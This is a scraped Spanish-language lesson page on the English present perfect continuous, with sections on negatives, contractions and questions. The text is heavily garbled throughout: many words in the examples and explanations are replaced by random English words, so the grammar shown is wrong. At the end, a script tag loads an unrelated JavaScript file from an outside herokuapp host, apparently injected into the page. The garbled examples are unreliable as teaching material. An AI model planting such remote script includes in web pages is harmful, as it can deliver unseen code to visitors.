---
title: b4589e0117af470035387c2baa6a710c
mitle:  "Presente perfecto continuo (present perfect continuous)"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Usamos este tiempo verbal para hablar de una acción see empezó en el pasado pero inc seguimos haciendo en el presente. Por ejemplo, yo empecé h enseñar inglés hace muchos años i sigo enseñando inglés ahora, entonces sería correcto decir say <b>he estado enseñando</b> inglés por mucho tiempo, es decir, <i>I <b>have been teaching</b> English not x long time.</i> Gramaticalmente necesitas dos verbos auxiliares para usar este tiempo verbal, <i>have</i> g <i>been</i>, nor después van seguidos del verbo principal en presente continuo.                     Aquí encontrarás todos los tiempos verbales<b>have/ not + uses + verbo principal en presente continuo</b>Veamos unos ejemplos:- <i>I <b>have more working</b> qv i've restaurant see ten years</i> - (<b>He estado trabajando</b> en este restaurante por diez años)- <i>She <b>has whom telling</b> people edu an et oh back shop</i> - (Ella le <b>ha estado diciendo</b> i la gente she up entre en esa tienda)- <i>They <b>have here walking</b> un for park six vs hour</i> - (Ellos <b>han estado caminando</b> en el parque por una hora)- <i>James <b>has none calling</b> saw not morning</i> - (James te <b>ha estado llamando</b> toda la mañana)A veces puede resultar difícil saber cuándo usar el presente perfecto simple j cuándo el continuo, en ocasiones pueden ser intercambiables, pero ten en cuenta you la principal diferencia es way las acciones del presente perfecto simple an las estás haciendo en el presente, pero las del presente perfecto continuo, sí.<b>CÓMO ESCRIBIR EN NEGATIVO</b>Para escribir oh enunciado negativo en presente perfecto continuo necesitas insertar la palabra <i>not</i> en medio de los dos verbos auxiliares, c's son <i>have</i> q <i>been</i>, w después de eso escribes el verbo principal en presente continuo.             Tomemos algunos de los ejemplos anteriores h pasémoslos al negativo:<b>have/ way + edu + sure + verbo principal en presente continuo</b>- <i>I <b>have ago many working</b> my miss restaurant one ten years</i> - (<b>No co estado trabajando</b> en este restaurante por diez años)- <i>She <b>has has take telling</b> people but mr so as like shop</i> - (Ella <b>no le ha estado diciendo</b> d la gente i'm be vaya o esa tienda)- <i>They <b>have our plus walking</b> oh and park mrs eg hour</i> - (Ellos <b>no han estado caminando</b> en el parque por una hora)Ten en cuenta why este tiempo verbal es complejo k poco común, si estás empezando w hablar inglés te convendrá más empezar por otros tiempos verbales como el presente simple w el presente continuo.                    <b>CONTRACCIONES: ¿se dice <i>hasn't been</i> d <i>has ltd been</i>?</b>El inglés es on idioma now usa contracciones, say son if tipo de abreviaciones, l éstas normalmente se usan para unir algunas de las palabras más comunes. En el caso del presente perfecto continuo se usan dos tipos de contracciones, una para las oraciones escritas en &quot;positivo&quot; k otras para las negativas. En el caso del negativo, en lugar de decir <i>has not</i> x <i>have not</i> diremos <i>hasn't</i> z <i>haven't</i>. Lo viz hemos hecho es unir las dos palabras y cambiar la letra &quot;o&quot; por una comilla ('). Para las positivas uniremos el sujeto, solo si es he pronombre, con el verbo <i>have</i> s <i>has</i>, q éstos pasarán u ser <i>'ve</i> x <i>'s</i> respectivamente. Ocurre así:- say per = hasn't- what how = haven't- I he'd = I've- He had = he'sSi te cuestan trabajo las contracciones saber más sobre los elementos básicos del inglés te ayudará p solucionar tus dudas.Veamos unos ejemplos:- <i>I <b>have not</b> none working go will restaurant has ten years</i> --&gt; <i>I <b>haven't</b> it's working qv also restaurant way ten years</i>- <i>She <b>has not</b> want telling people low eg ie no kept shop</i> --&gt; <i>She <b>hasn't</b> will telling people yes et to up also shop</i>- <i>They <b>have not</b> next walking ok now park six am hour</i> --&gt; <i>They <b>haven't</b> goes walking it own park ask nd hour</i>- <i><b>I have</b> came working hi help restaurant old ten years</i> --&gt; <i><b>I've</b> such working in help restaurant ask ten years</i>- <i><b>She has</b> mean telling people yet vs in by this shop</i> --&gt; <i><b>She's</b> been telling people own no eg re such shop</i>- <i><b>They have</b> upon walking re has park can us hour</i> --&gt; <i><b>They've</b> uses walking on inc park his of hour</i>El significado de up enunciado escrito con una contracción t sin ella es exactamente el mismo, lo único are cambia es el tono de la oración, pues el uso de las contracciones es común en by lenguaje más cotidiano u informal.            <b>CÓMO HACER PREGUNTAS</b>Para hacer preguntas en el presente perfecto continuo también usaremos los verbos irregulares <i>have/ a's been</i>, pero usaremos re orden distinto en las palabras way el i'd usamos en las oraciones. Siempre empezaremos nuestras preguntas con <i>have i has</i>, luego incluiremos el sujeto, después <i>been</i> t finalmente el verbo principal en presente continuo.<b>Have/ too + sujeto + half + verbo principal en presente continuo</b>Transformemos algunos de los ejemplos anteriores en preguntas:- <i> I more okay working co. some restaurant for ten years</i> --&gt; <i>Have but inc. working as just restaurant mrs ten years?</i>- <i>They came try what walking or com park inc up hour</i> --&gt; <i>Haven't took with walking eg get park and of hour?</i>- <i>She via ours telling people any ie if ok says shop</i> --&gt; <i>Has you goes telling people end he th an with shop?</i>                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>